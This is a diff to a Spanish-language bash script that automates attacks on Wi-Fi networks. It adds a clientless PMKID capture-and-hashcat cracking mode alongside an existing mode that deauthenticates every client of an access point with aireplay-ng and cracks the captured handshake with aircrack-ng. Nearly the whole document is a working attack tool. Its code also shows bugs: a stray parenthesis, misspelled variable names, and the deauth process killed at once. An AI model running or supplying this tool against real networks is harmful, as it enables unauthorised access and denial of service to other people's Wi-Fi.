@@ -41,7 +41,7 @@ function dependencias(){
 # Primero se limpiará la pantalla
 	clear
 # Creamos un vector donde se encuentran las herramientas necesarias:
-	dependencies=(aircrack-ng macchanger xterm)
+	dependencies=(aircrack-ng macchanger xterm hcxdumptool hcxpcaptool hashcat)
 	echo -e "${yellowColour}\n**** Comprobando programas necesarios ... ${endColour}\n"
 	sleep 2
 # Se recorre el vector que se ha creado anteriormente y se guarda en la variable program.
@@ -74,32 +74,65 @@ function startAtack(){
 	killall dhclient wpa_supplicant 2>/dev/null
 # Mostramos por consola la nueva MAC que se le ha asignado a la tarjeta de red:
 	echo -e "\n${yellowColour}**** Nueva dirección MAC asignada ${endColour}${blueColour}$(macchanger -s ${networkCard} | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"
+# Se comprueba el modo de ataque
+	if [ "$(echo $attack_mode)" == "Handshake" ]; then
+
 # Ahora haremos un airodump, pero el problema es que tenemos que monstrar y listar las redes que se pueden encontrar, pero en el mismo terminal en el que se corre el programa, para ello, lo que haremos será abrir una nueva consola donde se ejecutará y mostrará el comando y lo pondremos en segundo plano
-	xterm -hold -e "airodump-ng ${networkCard}" &
+		xterm -hold -e "airodump-ng ${networkCard}" &
 # Se captura y guarda el nombre del proceso de airodump entre medias:
-    airodump_xterm_PID=$!
+    	airodump_xterm_PID=$!
 
 # Se le preguntará al usuario el nombre del punto de acceso y el canal al que se quiere conectar, así además no se nos salta a que se apague el modo monitor (el proceso está en segundo plano)
-	echo -ne "\n${yellowColour}**** Nombre del punto de acceso al que se quiere acceder: ${endColour}" && read nombreAP
-    echo -ne "\n${yellowColour}**** Canal al que se quiere acceder: ${endColour}" && read canalAP
+		echo -ne "\n${yellowColour}**** Nombre del punto de acceso al que se quiere acceder: ${endColour}" && read nombreAP
+    	echo -ne "\n${yellowColour}**** Canal al que se quiere acceder: ${endColour}" && read canalAP
 # Se mata el proceso que estaba en segundo plano con el airodump corriendo
-	kill -9 $airdump_xterm_PID
+		kill -9 $airdump_xterm_PID
 # Se espera a que se termine el proceso una vez haya sido matado y no mostramos la salida (FINESHED)
-	wait $airodump_xterm_PID 2>/dev/null
+		wait $airodump_xterm_PID 2>/dev/null
 # Ahora se hace un airodump, pero filtrando para mostrar solo el canal y la red que interese. También se capturarán las evidencias en el fichero .cap
-	xterm -hold -e "airodump-ng -c $canalAP -w Captura --essid $nombreAP ${networkCard}" &
-	airodump_filter_PID=$!
+		xterm -hold -e "airodump-ng -c $canalAP -w Captura --essid $nombreAP ${networkCard}" &
+		airodump_filter_PID=$!
 # Pasamos a emitir paquetes de deautenticación para expulsar a los clientes, expulsaremos a todos usando la dirección FF:FF:FF:FF:FF:FF (Deautenticación global), de esta forma el cliente al reconectarse a la red, capturaremos el handshake, que se guardará en la captura. Se usará aireplay.
-	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $nombreAP -c FF:FF:FF:FF:FF:FF ${networkCard}" &
-	aireplay_PID=$!
-	kill -9 $aireplay_PID
-	wait $aireplay_PID 2>/dev/null
+		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $nombreAP -c FF:FF:FF:FF:FF:FF ${networkCard}" &
+		aireplay_PID=$!
+		kill -9 $aireplay_PID
+		wait $aireplay_PID 2>/dev/null
 # Esperamos 10 segundos y matamos el proceso de aurodump
-	sleep 10
-	kill -9 $airodump_filter_PID
-	wait $airodump_filter_PID 2>/dev/null
+		sleep 10
+		kill -9 $airodump_filter_PID
+		wait $airodump_filter_PID 2>/dev/null
 # Ahora romperemos la contraseña usando la captura que se ha captura. Se usará aircrack:
-	xterm -hold -e "aircrack-ng -w $diccionario Captura-01.cap" &
+		xterm -hold -e "aircrack-ng -w $diccionario Captura-01.cap" &
+# Comprobamos si se ha seleccionado el modo de ataque PKMID
+	elif [ "$(echo $attack_mode)" == "PKMID") ]; then
+# Se realiza este ataque que hace que la tarjeta se pueda escuchar paquetes y no hace falta que un cliente este en la red.
+		clear;
+		echo -e "${yellowColour}**** Iniciando Clientless PKMID Attack (Ataque a la AP sin necesidad de clientes) ${endColour}\n"
+# Se correrá la herramienta hcxdumptool para capturar los hashes que la AP manda (sin que haya clientes) y se guardará todo en un archivo que se llamará Captura
+		timeout 60 bash hcxdumptool -i ${networkcard} --enable_status=1 -o Captura
+		echo -e "${yellorColour}\n\n**** Obteniendo Hashes de la captura ${endColour}"
+# Se usará la herramienta hcxcaptool para obtener los hashes de la contraseña (posteriormente se crackeará)
+		sleep 2
+		hcxpcaptool -z myHashes Captura; 
+# Se borra el fichero Captura que ya no sirve para nada
+		rm Captura 2>/dev/null
+# Se comprueba si se ha podido capturar un hash clientless
+		test -f myHashes
+		if [ "$(echo $?)" == "0" ]; then
+			sleep 2
+			echo -e "${yellowColour}**** Iniciando el crackeo de contraseñas por fuerza bruta" 
+# Se pasará a crackear la contraseña de la red y se usará la herramiento hashcat
+			hashcat -m 16800 $diccionario myHashes -d 1 --force
+# Si no se encuentra, se muestra un mensaje explicando porque no se ha completado el ataque
+		else
+			echo -e "\n${yellowColour}**** No se ha podido completar el ataque, esto se debe porque justo en el minuto en que se ha corrido no se ha enviado ningún hash clientless por parte del AP (router)"
+			sleep 5
+		fi
+# En caso contrario se muestra un error de que no se ha seleccionado bien
+	else
+		echo -e "\n${redColour} **** Este modo de ataque no es valido ${endColour}\n"
+		helpPanel
+	fi
 }
 # Función helpPanel para monstrar el panel de ayuda:
 function helpPanel(){
@@ -143,8 +176,7 @@ if [ "$(id -u)" == "0" ]; then
 # Quitamos la tarjeta de red de modo monitor
 		airmon-ng stop ${networkCard} > /dev/null 2>&1
 # Borramos la captura
-	    rm Captura.* 2>/dev/null
-
+	    rm Captura* 2>/dev/null
 		tput cnorm
 	fi
 else
